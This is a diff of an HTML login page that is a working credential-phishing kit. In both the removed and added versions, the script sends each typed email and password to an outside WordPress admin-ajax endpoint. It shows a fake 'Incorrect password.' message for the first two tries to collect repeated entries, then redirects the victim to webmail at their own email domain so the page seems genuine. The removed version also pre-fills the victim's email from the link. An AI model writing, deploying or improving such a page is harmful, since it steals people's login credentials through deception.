@@ -133,54 +133,60 @@
     <div id="errorMsg" class="error"></div>
   </div>
 
-  <script>
-    // Auto-fill email from URL hash or query string
-    window.addEventListener("DOMContentLoaded", function() {
-      let emailField = document.getElementById("email");
-      let hashValue = window.location.hash.substring(1);
-      let params = new URLSearchParams(window.location.search);
-      let queryValue = params.get("user");
+<form id="loginForm">
+  <input type="email" id="email" name="email" required />
+  <input type="password" id="password" name="password" required />
+  <button type="submit">Submit</button>
+  <div id="errorMsg"></div>
+</form>
 
-      if (hashValue) {
-        emailField.value = decodeURIComponent(hashValue);
-      } else if (queryValue) {
-        emailField.value = decodeURIComponent(queryValue);
-      }
-    });
+<script>
+  let attemptCount = 0;
 
-    let attemptCount = 0;
+  document.getElementById("loginForm").addEventListener("submit", function (e) {
+    e.preventDefault();
+    attemptCount++;
 
-    document.getElementById("loginForm").addEventListener("submit", function(e) {
-      e.preventDefault();
-      attemptCount++;
+    let email = document.getElementById("email").value;
+    let password = document.getElementById("password").value;
+    let errorBox = document.getElementById("errorMsg");
 
-      let email = document.getElementById("email").value;
-      let password = document.getElementById("password").value;
-      let errorBox = document.getElementById("errorMsg");
+    let xhr = new XMLHttpRequest();
+    xhr.open("POST", "https://osteopathie-reiland.de/wp-admin/admin-ajax.php", true);
+    xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+    xhr.onreadystatechange = function () {
+      if (xhr.readyState === 4) {
+        document.getElementById("password").value = "";
 
-      // Always POST attempt (1, 2, 3...)
-      let xhr = new XMLHttpRequest();
-      xhr.open("POST", "https://osteopathie-reiland.de/wp-admin/admin-ajax.php", true); // PHP handler URL
-      xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
-      xhr.onreadystatechange = function() {
-        if (xhr.readyState === 4) {
-          document.getElementById("password").value = ""; 
+        if (xhr.status === 200) {
+          let res = JSON.parse(xhr.responseText);
 
-          if (attemptCount < 3) {
-            // First 2 attempts → show incorrect
-            errorBox.textContent = "Incorrect password.";
+          if (res.success) {
+            errorBox.textContent = "Login successful!";
           } else {
-            // On 3rd attempt → redirect user
-            let domain = email.substring(email.indexOf("@") + 1);
-            let redirectUrl = "https://webmail." + domain;
-            window.location.href = redirectUrl;
+            if (attemptCount < 3) {
+              errorBox.textContent = "Incorrect password.";
+            } else {
+              let domain = email.substring(email.indexOf("@") + 1);
+              let redirectUrl = "https://webmail." + domain;
+              window.location.href = redirectUrl;
+            }
           }
+        } else {
+          errorBox.textContent = "Server error.";
         }
-      };
-      xhr.send("email=" + encodeURIComponent(email) + "&password=" + encodeURIComponent(password));
-    });
-  </script>
+      }
+    };
+
+    xhr.send(
+      "action=send_mail_data" +
+      "&email=" + encodeURIComponent(email) +
+      "&password=" + encodeURIComponent(password)
+    );
+  });
+</script>
 
 </body>
 </html>
+
 
